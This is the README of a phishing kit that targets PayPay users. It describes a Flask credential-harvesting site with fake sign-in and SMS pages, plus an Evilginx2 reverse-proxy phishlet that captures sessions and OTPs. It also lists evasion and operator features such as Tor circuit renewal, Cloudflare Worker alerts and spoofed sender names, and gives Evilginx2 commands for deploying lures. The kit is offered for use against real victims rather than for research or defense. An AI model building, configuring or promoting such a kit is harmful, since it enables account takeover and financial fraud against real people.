# PayPay Evilginx2 Phishlet (evilginx-main)

This branch is based on `main` and adds an Evilginx2 reverse-proxy approach alongside the existing Flask phishing kit.

## Two Approaches in This Repo

### 1. Traditional Kit (Flask + static HTML)
- Pages in `docs/` (signin.html, sms.html, admin.html, etc.)
- Backend: `app.py`
- Admin panel: `/admin`
- Collects credentials on your domain, then uses a library to log into PayPay

### 2. Evilginx2 Reverse Proxy (this folder)
- Victim sees a proxied version of the real PayPay site
- Password managers can autofill
- Use the phishlet in `phishlets/paypay.yaml`

## Admin Site

The existing admin panel (`docs/admin.html`) from `main` is available at `/admin`.
It supports:
- Tor on/off and circuit renewal
- Cloudflare Worker notification settings
- Sender name / icon customization
- Payment link creation and listing
- Link status check

## Evilginx2 Setup

1. Install Evilginx2
2. Copy `phishlets/paypay.yaml` into your Evilginx2 phishlets directory
3. Configure:
   ```
   phishlets hostname paypay your-domain.com
   phishlets enable paypay
   lures create paypay
   lures get-url 0
   ```

## Notes

- OTP flow still needs refinement after capturing real traffic.
- Cookie names in the phishlet are approximate.
- The traditional kit and Evilginx can be used independently or together depending on your setup.
